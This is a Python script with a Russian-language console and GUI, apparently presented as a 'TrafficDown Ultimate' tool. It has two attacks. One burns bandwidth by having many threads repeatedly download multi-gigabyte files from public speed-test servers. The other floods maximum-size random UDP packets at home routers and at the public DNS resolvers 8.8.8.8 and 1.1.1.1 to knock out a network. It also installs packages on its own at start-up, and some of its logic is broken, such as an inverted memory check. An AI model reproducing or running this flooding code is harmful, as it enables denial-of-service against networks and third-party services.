# Автоматическая установка недостающих пакетов
import os
import sys
import importlib.util

packages = ["requests", "threading", "customtkinter", "socket", "colorama", "psutil"]
for package in packages:
    installed = importlib.util.find_spec(package)
    if not installed:
        os.system(f"python3 -m pip install {package}" if os.name != "nt" else f"python -m pip install {package}")
    if package != 'customtkinter':
        exec(f'import {package}')

# Основные импорты
import requests
import socket
import colorama
import psutil
import threading
import time
import random
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Проверка версии Python
if int(sys.version.split(' ')[0].split('.')[1]) < 12:
    input(f'Обновите Python до 3.12+ ({"apt update && apt upgrade && apt remove python3 && apt install python3" if os.name != "nt" else "Обновите через Microsoft Store / python.org"})')
    os._exit(0)

# Определяем режим работы: GUI или консоль
useTkinter = True if os.name == 'nt' else False

eat = False
killwifi = False
readed = [0]
readed_lock = threading.Lock()

urls = [
    'https://speed.hetzner.de/10GB.bin',
    'https://speed.hetzner.de/1GB.bin',
    'https://speedtest.selectel.ru/10GB',
    'https://speedtest.selectel.ru/1GB',
]

logo = '''████████╗██████╗░░█████╗░███████╗███████╗██╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗███╗░░██╗
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║████╗░██║
░░░██║░░░██████╔╝███████║█████╗░░█████╗░░██║██║░░╚═╝██║░░██║██║░░██║░╚██╗████╗██╔╝██╔██╗██║
░░░██║░░░██╔══██╗██╔══██║██╔══╝░░██╔══╝░░██║██║░░██╗██║░░██║██║░░██║░░████╔═████║░██║╚████║
░░░██║░░░██║░░██║██║░░██║██║░░░░░██║░░░░░██║╚█████╔╝██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░╚═╝░╚════╝░╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝'''
logoweight = 91

functions = [
 {'name':'traffic', 'description':'начать съедание трафика','handler':lambda: trafficDown()},
 {'name': 'wifikill', 'description':'убить интернет','handler':lambda: killWifiF()},
 {'name':'exit','description':'выход','handler':lambda: os._exit(0)}
]

# ---- ФУНКЦИИ ----

def downloadThread(url):
    global eat, readed
    headers = {'User-Agent': 'Mozilla/5.0'}

    while eat:
        try:
            chunkSize = 5_000_000
            r = requests.get(url, stream=True, verify=False, timeout=5, headers=headers)
            r.raise_for_status()

            for chunk in r.iter_content(chunk_size=chunkSize):
                if not eat: break
                if not chunk: continue
                chunk_size_mb = len(chunk) / 1024 / 1024

                with readed_lock:
                    readed[0] += len(chunk)

        except requests.exceptions.RequestException:
            pass

def trafficDown():
    global eat
    eat = True
    for _ in range(5):
        for url in urls:
            threading.Thread(target=downloadThread, args=(url,), daemon=True).start()

def sendpackets():
    global killwifi
    while killwifi:
        try:
            if psutil.virtual_memory().free//1024//1024<50:
                threading.Thread(target=makepacket).start()
            else:
                print(f'{colorama.Fore.RED}Мало ОЗУ! Ждем 5 сек...')
                time.sleep(5)
        except:
            pass

def killWifiF():
    global killwifi
    killwifi = True
    if not useTkinter:
        print(f'Нажмите ENTER для остановки Wi-Fi атаки')
        threading.Thread(target=sendpackets).start()
        input()
        killwifi = False

def makepacket():
    global killwifi
    while killwifi:
        try:
            threads = []
            for _ in range(500):
                t = threading.Thread(target=packetFlood)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
        except:
            pass

def packetFlood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        targets = [("192.168.1.1", 53), ("192.168.0.1", 80), ("8.8.8.8", 443), ("1.1.1.1", 53), ("192.168.100.1", 8080)]
        target = random.choice(targets)
        while killwifi:
            packet = os.urandom(65507)
            s.sendto(packet, target)
    except:
        pass

if useTkinter:
    from customtkinter import *

    window = CTk()
    window.resizable(False, False)
    set_appearance_mode("dark")
    set_default_color_theme("blue")
    window.protocol("WM_DELETE_WINDOW", lambda: os._exit(0))
    window.title('🔥 TrafficDown Ultimate Edition 🚀')
    window.geometry('500x400')  # Увеличиваем размер окна для дополнительного места
    window.configure(fg_color="#121212")

    frame = CTkFrame(window, fg_color="#1E1E1E", corner_radius=10)
    frame.pack(fill="both", expand=True, padx=10, pady=10)

    title_label = CTkLabel(frame, text="🚀 TrafficDown Ultimate", font=("Arial Black", 20), text_color="#00FF00")
    title_label.pack(pady=10)

    statuslbl = CTkLabel(frame, text="🔄 Ожидание команды...", font=('Arial Black', 14), text_color="#00FF00")
    statuslbl.pack(pady=5)

    traffic_lbl = CTkLabel(frame, text="Использовано трафика: 0 MB", font=('Arial', 12), text_color="#FFD700")
    traffic_lbl.pack(pady=5)

    def updateTrafficDisplay():
        traffic_mb = readed[0] / 1024 / 1024  # перевести в мегабайты
        traffic_lbl.configure(text=f"Использовано трафика: {traffic_mb:.2f} MB")

    def startEatCTkinter():
        global eat
        if eat:
            startbtn.configure(text='🔥 Запустить трафик-атаку', fg_color="green")
            statuslbl.configure(text='Трафик в норме')
            eat = False
        else:
            startbtn.configure(text='⛔ Остановить трафик', fg_color="red")
            eat = True
            trafficDown()

    def startKillCTkinter():
        global killwifi
        if killwifi:
            killwifibtn.configure(text='💀 Выключить Wi-Fi', fg_color="red")
            statuslbl.configure(text='Интернет включен')
            killwifi = False
        else:
            killwifibtn.configure(text='✅ Включить Wi-Fi', fg_color="green")
            statuslbl.configure(text='Интернет отключен!')
            killwifi = True
            threading.Thread(target=makepacket).start()

    startbtn = CTkButton(frame, text="🔥 Запустить сжирание трафика", command=startEatCTkinter,
                         fg_color="#007BFF", hover_color="#0056b3", corner_radius=10,
                         font=("Arial", 14, "bold"), text_color="white", width=200, height=40)
    startbtn.pack(pady=10)

    killwifibtn = CTkButton(frame, text="💀 Выключить Wi-Fi", command=startKillCTkinter,
                            fg_color="#DC3545", hover_color="#A71D2A", corner_radius=10,
                            font=("Arial", 14, "bold"), text_color="white", width=200, height=40)
    killwifibtn.pack(pady=10)

    # Запуск обновления статистики
    def update_gui():
        updateTrafficDisplay()
        window.after(1000, update_gui)  # обновляем каждую секунду

    update_gui()  # запуск обновления

    window.mainloop()
else:
    while True:
        os.system('clear' if os.name != 'nt' else 'cls')
        size = os.get_terminal_size()
        x, y = size.columns, size.lines

        # Вывод логотипа
        if x >= 91:
            print(f'{colorama.Fore.WHITE}{"\n".join([" " * (x // 2 - logoweight // 2) + line for line in logo.split("\n")])}')
        else:
            text = f'{colorama.Fore.WHITE}(Увеличь окно или уменьши шрифт)'
            print(f'{" " * (x // 2 - len(text) // 2)}{text}')

        # Статистика по использованному трафику
        traffic_mb = readed[0] / 1024 / 1024  # перевести в мегабайты
        traffic_text = f'Использовано трафика: {traffic_mb:.2f} MB'
        print(f'{" " * (x // 2 - len(traffic_text) // 2)}{colorama.Fore.YELLOW}{traffic_text}{colorama.Fore.WHITE}')

        # Вывод списка команд
        for function in functions:
            text = f'[{function["name"]}] - {function["description"]}'
            print(f'{" " * (x // 2 - len(text) // 2 + 6)}{colorama.Fore.CYAN}{text}{colorama.Fore.WHITE}')

        # Ввод команды
        text = 'Введите название функции:\t'
        choice = input(f'{" " * (x // 2 - len(text) // 2)}{colorama.Fore.GREEN}')

        for function in functions:
            if function['name'] == choice.lower().strip():
                function['handler']()
